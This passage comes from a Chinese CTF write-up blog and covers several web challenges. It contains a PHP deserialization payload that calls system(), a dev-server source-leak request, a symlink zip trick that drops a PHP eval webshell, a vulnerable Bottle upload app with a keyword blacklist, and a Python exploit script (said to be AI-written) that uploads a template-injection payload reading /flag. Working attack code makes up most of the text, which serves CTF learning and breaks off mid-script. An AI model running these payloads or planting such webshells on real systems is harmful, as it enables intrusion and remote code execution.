class="language-none">php -S localhost:8081curl -s -X POST 'http://node10.anna.nssctf.cn:23261/index.php?action=home' \-d 'file_to_check=O:11:"FileManager":2:{s:10:"targetFile";O:16:"ContentProcessor":2:{s:16:"processedContent";O:15:"FunctionInvoker":2:{s:12:"functionName";s:6:"system";s:17:"functionArguments";N;}s:16:"callbackFunction";s:3:"run";}s:13:"responseData";s:4:"test";}' \-d 'cmd=id' \-d 'method=performWriteOperation' \-d 'var=processedContent'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><p><a href="https://blog.csdn.net/weixin_46203060/article/details/129350280">PHP＜=7.4.21 Development Server源码泄露漏洞_php7.4.21漏洞-CSDN博客</a></p><p>hint是php -S</p><p>可以泄露源码</p><pre class="line-numbers language-none"><code class="language-none">GET /index.php HTTP/1.1Host: node10.anna.nssctf.cn:23387GET /123 123HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>原题</p><p><a href="https://blog.csdn.net/qq_44640313/article/details/130968721">https://blog.csdn.net/qq_44640313/article/details/130968721</a></p><pre class="line-numbers language-none"><code class="language-none">ln -s /var/www/html test #ln -s 源文件 目标文件 zip -y test1.zip test #-y：直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效； rm -rf test  #rm -rf 删除文件夹 mkdir test  #mkdir是make directory的缩写，Linux中 mkdir 命令用来创建指定的名称的目录，要求创建目录的用户在当前目录中具有写权限，并且指定的目录名不能是当前目录中已有的目录。 cd test echo '&lt;?php eval($_POST[1]);?&gt;' &gt;a.php cd .. zip -q -r test2.zip test #使用zip来将文件夹test压缩为test2.zip#-r代表 recursive，代表递归处理，将指定目录下的所有文件和子目录一并处理。#-q代表 quiet，代表无声模式，不输出压缩时的具体细节。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>zip –symlinks，是在zip压缩文件中，包含符号链接<br>本身，而不是它们指向的实际文件或目录，也就是说当<br>解压缩这个zip文件，将得到符号链接，而不是它们指向<br>的实际文件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/35401877529af3cb6f8283b97b3b5895.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lilctf</title>
      <link href="/2025/09/03/lictf/"/>
      <url>/2025/09/03/lictf/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.rkk.moe/2025/08/18/LilCTF-2025-Writeup/#Web">https://blog.rkk.moe/2025/08/18/LilCTF-2025-Writeup/#Web</a></p><hr><h3 id="ez-bottle"><a href="#ez-bottle" class="headerlink" title="ez_bottle"></a>ez_bottle</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> route<span class="token punctuation">,</span> run<span class="token punctuation">,</span> template<span class="token punctuation">,</span> post<span class="token punctuation">,</span> request<span class="token punctuation">,</span> static_file<span class="token punctuation">,</span> error<span class="token keyword">import</span> os<span class="token keyword">import</span> zipfile<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token comment"># hint: flag in /flag , have a try</span>UPLOAD_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>STATIC_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'static'</span><span class="token punctuation">)</span>MAX_FILE_SIZE <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BLACK_DICT <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"sock"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string">"bul"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span>              <span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token string">"open"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">contains_blacklist</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>black <span class="token keyword">in</span> content <span class="token keyword">for</span> black <span class="token keyword">in</span> BLACK_DICT<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_symlink</span><span class="token punctuation">(</span>zipinfo<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>zipinfo<span class="token punctuation">.</span>external_attr <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0o170000</span> <span class="token operator">==</span> <span class="token number">0o120000</span><span class="token keyword">def</span> <span class="token function">is_safe_path</span><span class="token punctuation">(</span>base_dir<span class="token punctuation">,</span> target_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>target_path<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>base_dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> static_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> root<span class="token operator">=</span>STATIC_DIR<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@route</span><span class="token punctuation">(</span><span class="token string">'/static/&lt;filename&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">server_static</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> static_file<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> root<span class="token operator">=</span>STATIC_DIR<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> static_file<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">,</span> root<span class="token operator">=</span>STATIC_DIR<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    zip_file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> zip_file <span class="token keyword">or</span> <span class="token keyword">not</span> zip_file<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid file. Please upload a ZIP file.'</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>zip_file<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> MAX_FILE_SIZE<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File size exceeds 1MB. Please upload a smaller ZIP file.'</span>    zip_file<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    current_time <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    unique_string <span class="token operator">=</span> zip_file<span class="token punctuation">.</span>filename <span class="token operator">+</span> current_time    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>unique_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    extract_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> md5_hash<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>    zip_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>extract_dir<span class="token punctuation">,</span> <span class="token string">'upload.zip'</span><span class="token punctuation">)</span>    zip_file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> z<span class="token punctuation">:</span>            <span class="token keyword">for</span> file_info <span class="token keyword">in</span> z<span class="token punctuation">.</span>infolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> is_symlink<span class="token punctuation">(</span>file_info<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">'Symbolic links are not allowed.'</span>                real_dest_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>extract_dir<span class="token punctuation">,</span> file_info<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> is_safe_path<span class="token punctuation">(</span>extract_dir<span class="token punctuation">,</span> real_dest_path<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">'Path traversal detected.'</span>            z<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>    <span class="token keyword">except</span> zipfile<span class="token punctuation">.</span>BadZipFile<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid ZIP file.'</span>    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>    files<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'upload.zip'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">(</span><span class="token string">"文件列表: {{files}}\n访问: /view/{{md5}}/{{first_file}}"</span><span class="token punctuation">,</span>                    files<span class="token operator">=</span><span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">,</span> md5<span class="token operator">=</span>md5_hash<span class="token punctuation">,</span> first_file<span class="token operator">=</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> files <span class="token keyword">else</span> <span class="token string">"nofile"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@route</span><span class="token punctuation">(</span><span class="token string">'/view/&lt;md5&gt;/&lt;filename&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_file</span><span class="token punctuation">(</span>md5<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> md5<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found."</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> contains_blacklist<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"you are hacker!!!nonono!!!"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> template<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error rendering template: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token decorator annotation punctuation">@error</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">error404</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"bbbbbboooottle"</span><span class="token decorator annotation punctuation">@error</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">error403</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Forbidden: You don't have permission to access this resource."</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">% import fileinput% m = ''.join(fileinput.input('/flag'))% raise Exception(m)#% print(m)没成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>fileinput 是 Python 自带库，不含黑名单关键字；fileinput.input(‘/flag’) 在库内部会打开文件（不要求你在模板里写 open），join 拼成字符串；<br>raise Exception(m) 没有下划线和冒号；后端会捕获异常并把消息 m（也就是 flag）回显在页面上。这正是 /view 路由的行为。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">curl -F "file=@x.zip" http://challenge.xinshi.fun:47328/upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Error rendering template: LILCTF{b0t71e_ha5_63En_ReCycIeD}</p><p>或者</p><blockquote><p>二次包含。先上传一个已知路径的文件，再 <code>include</code> 即可.</p><p>脚本是ai编写的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests  <span class="token comment"># 导入requests库，用于发送HTTP请求（如上传文件、访问URL）</span><span class="token keyword">import</span> zipfile   <span class="token comment"># 导入zipfile库，用于创建和处理ZIP压缩文件</span><span class="token keyword">import</span> os        <span class="token comment"># 导入os库，用于文件操作（如创建、删除文件）</span><span class="token keyword">import</span> re        <span class="token comment"># 导入re库，用于正则表达式匹配（如提取响应中的MD5值）</span><span class="token keyword">import</span> sys       <span class="token comment"># 导入sys库，用于系统级操作（如退出程序）</span>TARGET_URL <span class="token operator">=</span> <span class="token string">"http://challenge.xinshi.fun:35684"</span>  <span class="token comment"># 目标服务器URL（漏洞测试对象）</span><span class="token keyword">def</span> <span class="token function">create_zip</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""辅助函数：创建包含指定内容的ZIP压缩文件。"""</span> <span class="token comment"># 1. 先创建一个文本文件，写入指定内容</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>     f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token comment"># 2. 定义ZIP文件路径：将文本文件的后缀名从.txt改为.zip</span> zip_path <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.txt'</span><span class="token punctuation">,</span> <span class="token string">'.zip'</span><span class="token punctuation">)</span> <span class="token comment"># 3. 创建ZIP文件，并将刚才的文本文件添加到ZIP中</span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zf<span class="token punctuation">:</span>     zf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token comment"># 4. 返回创建好的ZIP文件路径</span> <span class="token keyword">return</span> zip_path<span class="token keyword">def</span> <span class="token function">upload_and_get_md5</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""辅助函数：上传ZIP文件，并从响应中解析出MD5值。"""</span> <span class="token keyword">try</span><span class="token punctuation">:</span>     <span class="token comment"># 1. 以二进制模式打开ZIP文件，准备上传</span>     <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>         <span class="token comment"># 构造文件上传参数：键为'file'，值包含文件名、文件对象、MIME类型（application/zip）</span>         files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token string">'application/zip'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>         <span class="token comment"># 发送POST请求到目标服务器的/upload接口，上传ZIP文件</span>         response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>TARGET_URL<span class="token punctuation">}</span></span><span class="token string">/upload"</span></span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>     <span class="token comment"># 2. 检查上传请求是否成功（HTTP状态码是否为200）</span>     <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] </span><span class="token interpolation"><span class="token punctuation">{</span>zip_path<span class="token punctuation">}</span></span><span class="token string"> 上传失败，状态码：</span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>         <span class="token keyword">return</span> <span class="token boolean">None</span>     <span class="token comment"># 3. 用正则表达式从响应文本中提取MD5值（匹配32位小写字母+数字的字符串）</span>     <span class="token comment"># 响应中通常包含类似"/view/abc123def456.../"的内容，MD5值就是中间的32位字符</span>     <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'/view/([a-f0-9]{32})/'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token keyword">match</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 无法从 </span><span class="token interpolation"><span class="token punctuation">{</span>zip_path<span class="token punctuation">}</span></span><span class="token string"> 的响应中解析出MD5值！"</span></span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    原始响应：</span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>         <span class="token keyword">return</span> <span class="token boolean">None</span>     <span class="token comment"># 4. 返回提取到的MD5值（正则匹配结果的第1个分组）</span>     <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 捕获网络请求相关异常（如连接超时、服务器无响应等）</span> <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 上传 </span><span class="token interpolation"><span class="token punctuation">{</span>zip_path<span class="token punctuation">}</span></span><span class="token string"> 时发生网络错误：</span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token comment"># --- 攻击流程 ---</span><span class="token comment"># 1. 第一步：上传恶意载荷文件（包含攻击代码的文件）</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 步骤1：准备并上传恶意载荷文件..."</span><span class="token punctuation">)</span>payload_filename <span class="token operator">=</span> <span class="token string">"payload.txt"</span>  <span class="token comment"># 恶意载荷文件名</span><span class="token comment"># 恶意载荷内容：利用模板注入漏洞执行系统命令（读取/flag文件内容）</span><span class="token comment"># {{...}} 是模板引擎语法，__import__('os') 动态导入os模块，popen('cat /flag') 执行读flag命令</span>payload_content <span class="token operator">=</span> <span class="token string">"{{__import__('os').popen('cat /flag').read()}}"</span><span class="token comment"># 创建包含恶意载荷的ZIP文件</span>payload_zip_path <span class="token operator">=</span> create_zip<span class="token punctuation">(</span>payload_filename<span class="token punctuation">,</span> payload_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 已创建载荷ZIP文件 '</span><span class="token interpolation"><span class="token punctuation">{</span>payload_zip_path<span class="token punctuation">}</span></span><span class="token string">'。"</span></span><span class="token punctuation">)</span><span class="token comment"># 上传恶意载荷ZIP，并获取其对应的MD5值（用于后续访问该文件的路径）</span>md5_payload <span class="token operator">=</span> upload_and_get_md5<span class="token punctuation">(</span>payload_zip_path<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> md5_payload<span class="token punctuation">:</span>  <span class="token comment"># 若获取MD5失败，退出程序</span> sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 恶意载荷上传成功。MD5值：</span><span class="token interpolation"><span class="token punctuation">{</span>md5_payload<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 2. 第二步：上传触发文件（用于触发恶意载荷执行的文件）</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] 步骤2：构造并上传触发文件..."</span><span class="token punctuation">)</span>trigger_filename <span class="token operator">=</span> <span class="token string">"trigger.txt"</span>  <span class="token comment"># 触发文件名</span><span class="token comment"># 触发文件内容：使用模板引擎的%include语法，包含已上传的恶意载荷文件</span><span class="token comment"># 路径格式：uploads/[载荷MD5值]/[载荷文件名]，这样访问触发文件时会自动执行载荷</span>trigger_content <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%include('uploads/</span><span class="token interpolation"><span class="token punctuation">{</span>md5_payload<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>payload_filename<span class="token punctuation">}</span></span><span class="token string">')"</span></span><span class="token comment"># ==========================================================================</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 触发文件内容为：</span><span class="token interpolation"><span class="token punctuation">{</span>trigger_content<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 创建包含触发逻辑的ZIP文件</span>trigger_zip_path <span class="token operator">=</span> create_zip<span class="token punctuation">(</span>trigger_filename<span class="token punctuation">,</span> trigger_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 已创建触发ZIP文件 '</span><span class="token interpolation"><span class="token punctuation">{</span>trigger_zip_path<span class="token punctuation">}</span></span><span class="token string">'。"</span></span><span class="token punctuation">)</span><span class="token comment"># 上传触发文件ZIP，并获取其对应的MD5值</span>md5_trigger <span class="token operator">=</span> upload_and_get_md5<span class="token punctuation">(</span>trigger_zip_path<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> md5_trigger<span class="token punctuation">:</span>  <span class="token comment"># 若获取MD5失败，退出程序</span> sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 触发文件上传成功。MD5值：</span><span class="token interpolation"><span class="token punctuation">{</span>md5_trigger<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 3. 第三步：访问触发文件URL，获取flag（执行恶意载荷）</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] 步骤3：访问触发文件URL以获取flag..."</span><span class="token punctuation">)</span><span class="token comment"># 构造访问触发文件的URL：格式为 目标URL/view/[触发文件MD5值]/[触发文件名]</span>flag_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>TARGET_URL<span class="token punctuation">}</span></span><span class="token string">/view/</span><span class="token interpolation"><span class="token punctuation">{</span>md5_trigger<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>trigger_filename<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 最终请求URL：</span><span class="token interpolation"><span class="token punctuation">{</span>flag_url<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token 